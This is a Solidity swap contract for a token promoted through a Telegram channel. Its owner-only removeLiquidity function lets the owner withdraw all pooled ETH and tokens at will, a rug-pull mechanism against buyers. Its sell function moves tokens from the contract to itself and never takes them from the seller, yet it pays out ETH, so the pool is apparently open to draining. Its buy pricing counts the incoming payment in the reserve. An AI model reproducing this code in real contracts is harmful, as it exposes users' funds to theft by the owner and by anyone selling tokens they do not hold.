// SPDX-License-Identifier: MIT
// Telegram: https://t.me/zerogastoken
pragma solidity ^0.8.25;
import "./TestLib.sol";
contract getReservesFacet {
    modifier onlyOwner() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender == ds.owner, "Ownable: caller is not the ds.owner");
        _;
    }

    function getReserves() public view returns (uint256, uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ((address(this).balance), ds.token.balanceOf(address(this)));
    }
    function removeLiquidity() public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        (uint256 reserveETH, ) = getReserves();

        (bool success, ) = payable(msg.sender).call{value: reserveETH}("");
        if (!success) {
            revert("Could not remove liquidity");
        }
        ds.token.transfer(ds.owner, ds.token.balanceOf(address(this)));
    }
    function getAmountOut(
        uint256 value,
        bool _buy // buy for true , sell for false
    ) public view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        (uint256 reserveETH, uint256 reserveToken) = getReserves();

        if (_buy) {
            uint256 valueAfterFee = (value * (10000 - ds.fee)) / 10000;
            return ((valueAfterFee * reserveToken)) / (reserveETH + value);
        } else {
            uint256 ethValue = ((value * reserveETH)) / (reserveToken + value);
            ethValue = (ethValue * (10000 - ds.fee)) / 10000;
            return ethValue;
        }
    }
    function buy(uint256 amountOutMin) public payable {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 feeAmount = (msg.value * ds.fee) / 10000;

        uint256 ETHafterFee;
        unchecked {
            ETHafterFee = msg.value - feeAmount;
        }

        (uint256 reserveETH, uint256 reserveToken) = getReserves();

        uint256 tokenAmount = (ETHafterFee * reserveToken) / reserveETH;
        require(tokenAmount > 0, "Bought amount too low");

        require(tokenAmount >= amountOutMin, "slippage reached");

        ds.token.transfer(msg.sender, tokenAmount);
    }
    function sell(uint256 sellAmount, uint256 amountOutMin) public {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            ds.lastTX[msg.sender] != block.number,
            "fuck u reentry atacker or mevbots"
        );

        ds.lastTX[msg.sender] = uint32(block.number);

        (uint256 reserveETH, uint256 reserveToken) = getReserves();

        uint256 ethAmount = (sellAmount * reserveETH) /
            (reserveToken + sellAmount);

        require(reserveETH >= ethAmount, "Insufficient ETH in reserves");

        uint256 feeAmount = (ethAmount * ds.fee) / 10000;

        unchecked {
            ethAmount -= feeAmount;
        }
        require(ethAmount > 0, "Sell amount too low");
        require(ethAmount >= amountOutMin, "slippage reached");

        ds.token.transfer(address(this), sellAmount);

        (bool success, ) = payable(msg.sender).call{value: ethAmount}("");
        if (!success) {
            revert("Could not sell");
        }
    }
}
